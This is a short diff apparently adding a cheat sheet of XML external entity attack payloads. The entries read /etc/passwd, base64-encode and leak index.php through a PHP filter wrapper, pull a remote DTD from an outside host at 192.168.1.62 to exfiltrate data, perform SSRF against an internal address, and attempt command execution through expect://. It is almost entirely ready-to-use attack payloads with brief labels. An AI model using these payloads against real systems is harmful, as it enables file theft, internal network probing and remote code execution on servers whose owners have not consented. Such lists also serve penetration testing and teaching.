@@ -1,0 +1,35 @@
+
+// Simple read /etc/passwd
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+ <userInfo>
+  <user>&xxe;</user>
+ </userInfo>
+
+// With PHP wrapper
+<?xml version="1.0" ?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
+ <userInfo>
+  <user>&xxe;</user>
+ </userInfo>
+
+// Remote DTD file
+<?xml version="1.0" ?>
+<!DOCTYPE user [
+<!ELEMENT user ANY >
+<!ENTITY % sp SYSTEM "http://192.168.1.62:8802/evil.dtd">
+%sp;
+%param1;
+]>
+<user>&exfil;</user>
+
+// SSRF 
+<?xml version="1.0"?>
+<!DOCTYPE name [<!ENTITY xxe SYSTEM "http://192.168.1.62:7777" >]>
+<name>&xxe;</name>
+
+// RCE - doesnt work, need expect extension
+<?xml version="1.0"?>
+<!DOCTYPE name [<!ENTITY xxe SYSTEM "expect://id" >]>
+<name>&xxe;</name>
+
